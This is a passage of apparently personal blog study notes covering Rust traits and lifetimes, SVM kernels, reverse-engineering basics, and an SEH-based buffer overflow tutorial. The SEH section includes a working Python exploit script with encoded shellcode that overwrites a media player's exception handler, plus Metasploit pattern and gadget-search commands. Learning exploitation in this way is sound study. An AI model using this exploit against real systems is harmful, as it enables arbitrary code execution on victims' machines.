class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p3.x = &#123;&#125;, p3.y = &#123;&#125;&quot;</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p>
<p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>相当于提供一个接口，具体内容自己实现</code><br>与Java一个概念类似</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>添加trait到结构中</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;, by &#123;&#125; (&#123;&#125;)&quot;</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, they’re all in the same scope. Let’s say this lib.rs is for a crate we’ve called aggregator and someone else wants to use our crate’s functionality to implement the Summary trait on a struct defined within their library’s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p>
<p>with trait implementations is that we can<code> implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>can’t implement external traits on external types.</code></p>
<p>as we implement the trait on a particular type, we can keep or override each method’s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">&quot;(Read more...)&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Default implementations can call other methods in the same trait, even if those other methods don’t have a default implementation.</p>
<p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p>
<pre><code>fn summarize(&amp;self) -&gt; String &#123;
    format!(&quot;(Read more from &#123;&#125;...)&quot;, self.summarize_author())
&#125;</code></pre>
<p>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(“@{}”, self.username)<br>    }<br>}<br>}</p>
<p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p>
<p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p>
<p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p>
<p>pub fn notify(item: &amp;impl Summary) {<br>    println!(“Breaking news! {}”, item.summarize());<br>}</p>
<h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>传入的类型必须相同</p>
<pre><code>pub fn notify(item: &amp;(impl Summary + Display)) &#123;
pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) &#123;

fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32
    where T: Display + Clone,
          U: Clone + Debug
&#123;</code></pre>
<p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p>
<p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p>
<p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p>
<p>fn returns_summarizable() -&gt; <code>impl Summary &#123;</code><br>    Tweet {<br>        username: String::from(“horse_ebooks”),<br>        content: String::from(<br>            “of course, as you probably already know, people”,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>限制只能传进i32 char等</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p>
<pre><code>let result = largest(&amp;number_list);
println!(&quot;The largest number is &#123;&#125;&quot;, result);

let char_list = vec![&#39;y&#39;, &#39;m&#39;, &#39;a&#39;, &#39;q&#39;];

let result = largest(&amp;char_list);
println!(&quot;The largest char is &#123;&#125;&quot;, result);</code></pre>
<p>}</p>
<p>impl&lt;T: Display&gt; ToString for T {<br>    // –snip–<br>}</p>
<h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>we’ll add generic lifetime parameters that define the relationship between the references </p>
<p>lifetime<br>Lifetime annotations <code>don’t change</code> how long any of the references live. </p>
<pre><code>&amp;i32        // a reference
&amp;&#39;a i32     // a reference with an explicit lifetime
&amp;&#39;a mut i32 // a mutable reference with an explicit lifetime</code></pre>
<p>have a function with the parameter first that is a reference to an i32 with lifetime ‘a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime ‘a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line">    let string2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">&quot;The longest string is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">&#x27;a&gt;(x: &amp;&#x27;</span>a str, <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str) -&gt; &amp;&#x27;</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>返回的引用取最短的lifetime</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">&#x27;a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;&#x27;</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">&quot;Call me Ishmael. Some years ago...&quot;</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">&#x27;.&#x27;</span>).<span class="keyword">next</span>().expect(<span class="string">&quot;Could not find a &#x27;.&#x27;&quot;</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>an instance of ImportantExcerpt can’t <code>outlive the reference it</code><br>holds in its part field.</p>
<h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>由编译器进行引用lifetime的编写<br>三个阶段</p>
<h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">&#x27;static str = &quot;I have a static lifetime.&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>means that this reference can live for the entire duration of the program</p>
<p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(“abcd”);<br>    let string2 = “xyz”;</p>
<pre><code>let result = longest_with_an_announcement(
    string1.as_str(),
    string2,
    &quot;Today is someone&#39;s birthday!&quot;,
);
println!(&quot;The longest string is &#123;&#125;&quot;, result);</code></pre>
<p>}</p>
<p>use std::fmt::Display;</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">&#x27;a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;&#x27;</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;&#x27;</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">&quot;Announcement! &#123;&#125;&quot;</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert! </code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p>
<p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p>
<p>should_panic  产生panic返回正确</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">&quot;Guess value must be between 1 and 100, got &#123;&#125;.&quot;</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = &quot;Guess value must be less than or equal to 100&quot;)]</span></span><br></pre></td></tr></table></figure>

<p>the unit type, ()</p>
<p>TDD process</p>
<p>test 还是很不多的，C++的时候都一遍遍输入参数</p>
<p><code>$ cargo run &gt; output.txt</code></p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>SEH</title>
    <url>/2020/09/21/SEH/</url>
    <content><![CDATA[<h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a>
<p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> ————————— (1)<br>                            |<br>                     ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p>
<p>当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址</p>
<p>the <code>first pop</code> will take off<code> 4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code> ESP+8</code>, but because of the 2 pop’s now sits at the top of the stack) and puts that in <code>EIP</code>.</p>
<h5 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h5><p>ollydbg VIEW-SEH CHAIN</p>
<h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>产生一个序列，用于定位溢出点</p>
<p>msf5 &gt; msfpescan -p Player.dll | grep -v “000”<br>寻找pop pop ret 命令地址 -v 不匹配“000”</p>
<p>int 3 指令（0xcc） 中断指令</p>
<pre><code>import struct

uitext = &quot;ui_exploit.txt&quot;
junk = &quot;\x41&quot; * 584
seh_next = &quot;\xeb\x04\x90\x90&quot;
seh_handler = str(struct.pack(&#39;&lt;L&#39;, 0x10018de8))
shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\
            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\
            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\
            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\
            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\
            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\
            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\
            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\
            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\
            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\
            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\
            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\
            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\
            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\
            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\
            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\
            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\
            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\
            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\
            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\
            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\
            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;
junk2 = &quot;\x90&quot; * 1000
fp = open(uitext, &#39;w&#39;)
content = junk + seh_next + seh_handler + shellcode + junk2
fp.write(content)
fp.close()</code></pre>
<p>总结：<br>SEH链条结构及其在栈中的位置<br>Windows XP SP1添加的XOR和SafeSEH保护机制<br>通过msf的msfpescan从dll中查找带有想要操作的函数（“POP POP RET”）<br>RET操作作为exploit方式的优缺点<br>通过<code>windbg</code>的”!analyze -v“ 和“!exchain”命令查看current SEH指针内容<br>windbg：d eip ; !exchain命令 ；u 地址 ；g 运行</p>
<p>frog 青蛙</p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>SVM学习笔记1</title>
    <url>/2020/03/31/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<p><a href="https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s">https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s</a><br>参考视频课程</p>
<p>mvnrnd（）产生特定均值和协方差的矩阵</p>
<hr>
<a id="more"></a>

<p>kenel 矩阵要有限正半定，kenel函数：R^d-&gt;R<br><a href="https://imgchr.com/i/GQilQJ"><img src="https://s1.ax1x.com/2020/03/31/GQilQJ.th.png" alt="GQilQJ.th.png"></a></p>
<hr>
<p>常见kenel 可以自己构造<br><a href="https://imgchr.com/i/GQF9Tx"><img src="https://s1.ax1x.com/2020/03/31/GQF9Tx.th.png" alt="GQF9Tx.th.png"></a></p>
<hr>
<p>REPRODUCING KENEL MAP<br>由kenel 推出 feature mapping 以及其逆<br><img src="https://s1.ax1x.com/2020/03/31/GQdhI1.png" alt="GQdhI1.png"></p>
<hr>
<p>Principal Component Analysis 主成分分析<br>KPCA</p>
<hr>
<p>Linear Discriminant Analysis 線性區別分析<br>投影坐标：内积*v<br>廣義區別分析(Generalized Discriminant Analysis)。</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQUvmd.png" alt="GQUvmd.png"></p>
<hr>
<p>KKT svm证明中会用到<br><img src="https://s1.ax1x.com/2020/03/31/GQdzJP.png" alt="GQdzJP.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQwZiq.png" alt="GQwZiq.png"></p>
<hr>
<p>其他</p>
<p><a href="https://ww2.mathworks.cn/help/matlab/data-type-conversion.html">https://ww2.mathworks.cn/help/matlab/data-type-conversion.html</a><br>matlab 数据类型转换</p>
<pre><code>&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;</code></pre>
]]></content>
      <tags>
        <tag>SVM</tag>
      </tags>
  </entry>
  <entry>
    <title>SVM学习笔记2</title>
    <url>/2020/04/01/SVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>凸二次规划 ==  开口向下</p>
<hr>
<p>分类靠支撑向量计算  其 a~=0</p>
<a id="more"></a>
<hr>
<p>hard-margin</p>
<p>soft-margin 容忍一些误差<br>每个容忍值和希望最小</p>
<hr>
<p>KKT帮助确定a ， L函数系数 拉格朗日</p>
<hr>
<p>K-fold 数据分成k份进行train test<br>获取最佳参数</p>
<p>调用crossval就是要找到参数C(惩罚系数)和sigma，使误分率mcr最小</p>
<hr>
<p>one vs one<br>多类判定投票</p>
<p>one vs all<br>有符号距离取最大</p>
<hr>
<p>才发现 matlab %%<br>%%<br>运行节</p>
<hr>
<p>代码<br>参考 <a href="http://www.matlabsky.com/thread-11026-1-1.html">http://www.matlabsky.com/thread-11026-1-1.html</a></p>
<p><code>fitcsvm()</code><br>使用<code>&#39;OptimizeHyperparameters&#39; </code>- 要优化的参数 和<br><code>&#39;HyperparameterOptimizationOptions&#39;</code> - 优化的选项<br><code>来找到最佳sigma 和 C 罚因子</code></p>
]]></content>
      <tags>
        <tag>SVM</tag>
      </tags>
  </entry>
  <entry>
    <title>bug</title>
    <url>/2019/11/20/bug/</url>
    <content><![CDATA[<ol>
<li>修复了发布时间超前的问题</li>
</ol>
<p>–在配置文件中将时区修改为<code>Asia/Shanghai</code><br><del>2019-11-20 20:28:32 星期三</del></p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>ch25.bin</title>
    <url>/2020/10/05/ch25bin/</url>
    <content><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a></p>
<a id="more"></a>
<h4 id="识别C-类"><a href="#识别C-类" class="headerlink" title="识别C++类"></a>识别C++类</h4><p>如何识别软件是用C++所写？<br>1 频繁使用ECX 保存this 指针 ，指向类对象，如在调用函数前<br>2 虚函数 要先知道类虚函数表，然后得到实际值，也是传到ECX中<br>3 使用STL code 可用IDA imports查看</p>
<h4 id="类怎么在内存中存储"><a href="#类怎么在内存中存储" class="headerlink" title="类怎么在内存中存储"></a>类怎么在内存中存储</h4><p>每个变量四字节<br>不足要对齐<br>内存中排列与定义相同</p>
<hr>
<p>虚函数表要在最开头<br>表包含虚函数地址，按定义排序</p>
<p><strong>如果继承另一个类</strong></p>
<p>继承多个类<br><strong>虚表按顺序排序</strong></p>
<hr>
<h4 id="识别类"><a href="#识别类" class="headerlink" title="识别类"></a>识别类</h4><h5 id="1-识别构建和撤销"><a href="#1-识别构建和撤销" class="headerlink" title="1 识别构建和撤销"></a>1 识别构建和撤销</h5><h6 id="1-1-全局变量"><a href="#1-1-全局变量" class="headerlink" title="1.1 全局变量"></a>1.1 全局变量</h6><p>在编译时 保存到（PE）文件的数据段<br>构建在main()前调用</p>
<h6 id="用this调用全局变量，在EP和main-间，确定为构建"><a href="#用this调用全局变量，在EP和main-间，确定为构建" class="headerlink" title="用this调用全局变量，在EP和main()间，确定为构建"></a>用this调用全局变量，在EP和main()间，确定为构建</h6><p>1.2局部变量<br>指针指向未初始化的栈变量</p>
<h6 id="1-3动态分配变量-new-）"><a href="#1-3动态分配变量-new-）" class="headerlink" title="1.3动态分配变量 new(）"></a>1.3动态分配变量 new(）</h6><p>堆上分配</p>
<h5 id="2多态类识别"><a href="#2多态类识别" class="headerlink" title="2多态类识别"></a>2多态类识别</h5><h6 id="2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"><a href="#2-1鉴别多态通过RTTI，其可以让对象在运行时确定类型。" class="headerlink" title="2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。"></a>2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。</h6><p>RTTICompleteObjectLocator pointer</p>
<hr>
<p>TypeDescriptor<br>指向的结构包含类名</p>
<hr>
<p>RTTIClassHierarchyDescriptor</p>
<hr>
<p>RTTIBaseClassDescriptor</p>
<hr>
<p>vftable<br>vbtable (virtual base class table)</p>
<hr>
<h3 id="指令E9"><a href="#指令E9" class="headerlink" title="指令E9 "></a>指令<code>E9 </code></h3><p>指令<code>E9 </code>相对寻址<br>e9 xxxxxxxx<br><code>xxxxxxxx=要跳转的地址-当前指令地址-当前指令长度（5）</code><br>e9 00 00 00 00  即跳转到下一个地址<br>402005-402000-5=000000</p>
<h3 id="指令EB"><a href="#指令EB" class="headerlink" title="指令EB"></a>指令<code>EB</code></h3><p><code>EB</code>表示short jmp命令，进行短距离跳转<br>eb xx</p>
<hr>
<h3 id="指令setne"><a href="#指令setne" class="headerlink" title="指令setne"></a>指令setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p>
<p>strings 命令<br>display printable strings in [file(s)] (stdin by default)</p>
<hr>
